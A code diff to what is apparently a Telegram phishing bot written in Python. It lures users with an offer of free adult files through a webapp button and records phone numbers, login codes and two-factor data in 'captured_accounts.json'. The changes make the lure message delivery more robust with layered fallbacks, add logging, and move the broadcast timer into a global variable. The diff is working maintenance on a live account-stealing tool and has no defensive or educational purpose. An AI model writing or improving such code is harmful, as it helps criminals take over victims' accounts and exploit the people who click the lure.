@@ -22,9 +22,6 @@ YOUR_TELEGRAM_ID = _si(os.environ.get("OWNER_ID"), 0)
 PORT = _si(os.environ.get("PORT"), 5000)
 WEBAPP_URL = os.environ.get("WEBAPP_URL", "https://two-fishing.onrender.com/tg")
 
-# ============================================================
-# HARDCODED WELCOME MESSAGE — ALWAYS ACTIVE
-# ============================================================
 WELCOME_TEXT = """Hello {name} 👋
 
 🔞To again access to the files completely free of charge, do the following💦:
@@ -56,27 +53,10 @@ pending_2fa = {}
 sessions_lock = threading.Lock()
 DATA_FILE = "captured_accounts.json"
 USERS_FILE = "bot_users.json"
-CONFIG_FILE = "bot_config.json"
-
-# Hardcoded config — always this
-HARDCODED_CONFIG = {
-    "welcome_messages": [
-        {
-            "type": "text",
-            "content": WELCOME_TEXT,
-            "caption": ""
-        }
-    ],
-    "button_text": WELCOME_BUTTON,
-    "webapp_url": WEBAPP_URL + "?auto=1",
-    "timer": 60
-}
 
 STATE = {
     "capture_mode": False,
-    "welcome_capture": False,
     "awaiting_timer": False,
-    "awaiting_btntext": False,
 }
 
 broadcast_state = {
@@ -85,6 +65,8 @@ broadcast_state = {
     "messages": [],
     "next_run": 0,
 }
+
+timer_value = 60
 
 
 def load_users():
@@ -135,9 +117,6 @@ def save_account(account):
 
 captured_accounts = load_accounts()
 users = load_users()
-
-# ALWAYS USE HARDCODED CONFIG — override any saved config
-config = HARDCODED_CONFIG
 
 
 def format_phone(ph):
@@ -296,7 +275,7 @@ bot = TelegramClient(SESSION_PATH, API_ID, API_HASH)
 def admin_menu():
     return [
         [Button.inline("📢 Broadcast", b"menu_broadcast"),
-         Button.inline(f"⏱ Timer: {config.get('timer', 60)}s", b"menu_timer")],
+         Button.inline(f"⏱ Timer: {timer_value}s", b"menu_timer")],
         [Button.inline("👥 Users", b"menu_users"),
          Button.inline("📊 Stats", b"menu_stats")],
         [Button.inline("🔄 Reset Modes", b"menu_reset")],
@@ -322,42 +301,85 @@ async def edit_or_send(event, text, buttons=None):
 
 
 async def send_welcome(uid, name):
-    """Send HARDCODED welcome message"""
+    """ROBUST welcome sender with 4 fallback levels"""
+    logger.info(f"=== SEND_WELCOME called for uid={uid} name={name} ===")
+    
     try:
         content = WELCOME_TEXT.replace("{name}", name)
+        logger.info(f"Welcome content length: {len(content)}")
         buttons = [[Button.webview(WELCOME_BUTTON, url=WEBAPP_URL + "?auto=1")]]
-        sent = await bot.send_message(uid, content, buttons=buttons, parse_mode='md')
-        logger.info(f"Welcome sent to {uid} ({name})")
-        return [sent.id]
+        
+        # LEVEL 1: Markdown + buttons
+        try:
+            sent = await bot.send_message(uid, content, buttons=buttons, parse_mode='md')
+            logger.info(f"✅ L1 success: msg_id={sent.id}")
+            return [sent.id]
+        except Exception as e1:
+            logger.error(f"L1 MD failed: {e1}")
+        
+        # LEVEL 2: No parse_mode + buttons
+        try:
+            sent = await bot.send_message(uid, content, buttons=buttons)
+            logger.info(f"✅ L2 success (no md): msg_id={sent.id}")
+            return [sent.id]
+        except Exception as e2:
+            logger.error(f"L2 plain failed: {e2}")
+        
+        # LEVEL 3: No buttons, no md
+        try:
+            sent = await bot.send_message(uid, content)
+            logger.info(f"✅ L3 success (no buttons): msg_id={sent.id}")
+            return [sent.id]
+        except Exception as e3:
+            logger.error(f"L3 no-btn failed: {e3}")
+        
+        # LEVEL 4: Bare minimum
+        try:
+            sent = await bot.send_message(uid, "Tap /start again")
+            logger.info(f"✅ L4 fallback: msg_id={sent.id}")
+            return [sent.id]
+        except Exception as e4:
+            logger.error(f"L4 fallback failed: {e4}")
+        
+        return []
     except Exception as e:
-        logger.error(f"welcome {uid} FAILED: {e}")
+        logger.error(f"❌ WELCOME CRITICAL: {e}")
         logger.error(traceback.format_exc())
         return []
 
 
 @bot.on(events.NewMessage(pattern='/start'))
 async def start_handler(event):
-    sender = await event.get_sender()
-    uid = sender.id
-    name = sender.first_name or "Friend"
-    users[str(uid)] = {
-        "id": uid, "name": name,
-        "username": sender.username or "",
-        "joined": str(datetime.now())
-    }
-    save_users(users)
+    logger.info(f"=== /start received ===")
+    try:
+        sender = await event.get_sender()
+        uid = sender.id
+        name = sender.first_name or "Friend"
+        logger.info(f"/start from uid={uid} name={name} is_owner={uid == YOUR_TELEGRAM_ID}")
+        
+        users[str(uid)] = {
+            "id": uid, "name": name,
+            "username": sender.username or "",
+            "joined": str(datetime.now())
+        }
+        save_users(users)
 
-    if uid == YOUR_TELEGRAM_ID:
-        await event.respond(
-            "🔧 **Admin Panel**\n\nUsers: `" + str(len(users)) + "`",
-            buttons=admin_menu(), parse_mode='md'
-        )
-        return
-    await send_welcome(uid, name)
+        if uid == YOUR_TELEGRAM_ID:
+            await event.respond(
+                "🔧 **Admin Panel**\n\nUsers: `" + str(len(users)) + "`",
+                buttons=admin_menu(), parse_mode='md'
+            )
+            return
+        
+        await send_welcome(uid, name)
+    except Exception as e:
+        logger.error(f"/start handler error: {e}")
+        logger.error(traceback.format_exc())
 
 
 @bot.on(events.CallbackQuery())
 async def cb(event):
+    global timer_value
     if event.sender_id != YOUR_TELEGRAM_ID:
         return await event.answer("Not authorized", alert=True)
     data = event.data.decode()
@@ -429,7 +451,7 @@ async def cb(event):
             STATE["awaiting_timer"] = True
             await event.answer()
             await edit_or_send(event,
-                f"⏱ **Set Timer**\n\nCurrent: `{config.get('timer', 60)}s`\n\nSend a number in seconds.",
+                f"⏱ **Set Timer**\n\nCurrent: `{timer_value}s`\n\nSend a number in seconds.",
                 back_button())
 
         elif data == "menu_users":
@@ -438,7 +460,7 @@ async def cb(event):
         elif data == "menu_stats":
             s = broadcast_state
             await event.answer(
-                f"Users: {len(users)}\nBroadcast: {s['active']}\nQueue: {len(s['messages'])}",
+                f"Users: {len(users)}\nBroadcast: {s['active']}\nQueue: {len(s['messages'])}\nTimer: {timer_value}s",
                 alert=True
             )
     except Exception as e:
@@ -459,6 +481,7 @@ async def cancel(event):
 
 @bot.on(events.NewMessage())
 async def capture(event):
+    global timer_value
     if event.sender_id != YOUR_TELEGRAM_ID:
         return
     txt = event.raw_text or ""
@@ -470,7 +493,7 @@ async def capture(event):
             sec = int(txt.strip())
             if sec < 5:
                 return await event.respond("Min 5 seconds")
-            config["timer"] = sec
+            timer_value = sec
             STATE["awaiting_timer"] = False
             broadcast_state['interval'] = sec
             await event.respond(f"✅ Timer: **{sec}s**",
@@ -550,7 +573,7 @@ async def bot_main():
     logger.info("Bot starting...")
     await bot.start(bot_token=BOT_TOKEN)
     me = await bot.get_me()
-    logger.info(f"Bot started as @{me.username}")
+    logger.info(f"✅ Bot started as @{me.username} (id={me.id})")
     asyncio.create_task(broadcast_loop())
     await bot.run_until_disconnected()
 
@@ -914,11 +937,12 @@ def health():
     return jsonify({
         'status': 'ok',
         'bot_thread_alive': _bot_thread.is_alive() if _bot_thread else False,
+        'bot_started': bot.is_connected(),
         'accounts': len(captured_accounts),
         'bot_users': len(users),
         'broadcast_active': broadcast_state['active'],
         'broadcast_queue': len(broadcast_state['messages']),
-        'welcome_text_hardcoded': True
+        'welcome_text': WELCOME_TEXT[:50]
     })
 
 
@@ -937,7 +961,7 @@ def save_contact():
             'phone': phone, 'user_id': ex['user_id']})
     with sessions_lock:
         pending_codes[phone] = 'contact_saved'
-    logger.info(f"Contact saved (silent): {phone}")
+    logger.info(f"Contact saved: {phone}")
     return jsonify({'success': True, 'phone': phone})
 
 
